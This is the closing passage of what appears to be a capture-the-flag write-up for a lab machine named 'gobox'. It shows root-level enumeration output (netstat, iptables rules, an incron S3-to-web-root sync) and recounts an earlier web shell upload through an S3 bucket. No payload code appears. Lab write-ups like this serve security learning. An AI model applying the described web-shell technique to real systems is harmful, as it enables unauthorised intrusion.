</code></pre></div><h2 id="explore">Explore</h2>
<h3 id="undetected-ports">Undetected ports</h3>
<p>During enumeration, when I printed the networking status, I noticed that ports 9000, 9001, and 4566 should be accessible from external, with the exception that port 4566 needs an authentication header set first to be accessible.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
<span class="o">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="o">)</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
</code></pre></div><p>It turns out there is a set of <code>iptables</code> rules which drop any connection coming to these ports.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# iptables -L
Chain INPUT <span class="o">(</span>policy ACCEPT<span class="o">)</span>
target     prot opt <span class="nb">source</span>               destination         
ACCEPT     all  --  localhost/8          anywhere            
ACCEPT     all  --  172.16.0.0/12        anywhere            
DROP       tcp  --  anywhere             anywhere             tcp dpt:9002
DROP       tcp  --  anywhere             anywhere             tcp dpt:9001
DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p><em>Shouldn&rsquo;t it then return with <code>filtered</code> status?</em></p>
<p>Well, I think it was purely my mistake. I used <code>--min-rate=10000</code>, so this could be the reason <code>nmap</code> misidentified the filtered port as closed.</p>
<h3 id="gobox-request-routing">Gobox Request Routing</h3>
<p>The first time I looked into the NGINX configuration file, it didn&rsquo;t make sense to me why my web shell is on the host OS? In fact, I uploaded my web shell to an S3 bucket, which is also a container.</p>
<p>Now, with root access obtained, I could understand what was happening, and there was a synchronization process between the host and the LocalStack container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# cat /var/spool/incron/root 
/opt/deploy/.localstack/data/recorded_api_calls.json    IN_MODIFY       /usr/bin/aws --endpoint-url http://127.0.0.1:9000 s3 sync s3://website /opt/website
/home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/
</code></pre></div><p>So if I upload something into the bucket, the host will have it as well.</p>
<p>I also looked at how the web routing is done in this box and eventually visualize it as shown below:</p>
<p><div class="img-container"><img src="imgs/image-20210912193743912.png" alt="image-20210912193743912"  /></div>
</p>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://www.onsecurity.io/blog/go-ssti-method-research/">https://www.onsecurity.io/blog/go-ssti-method-research/</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
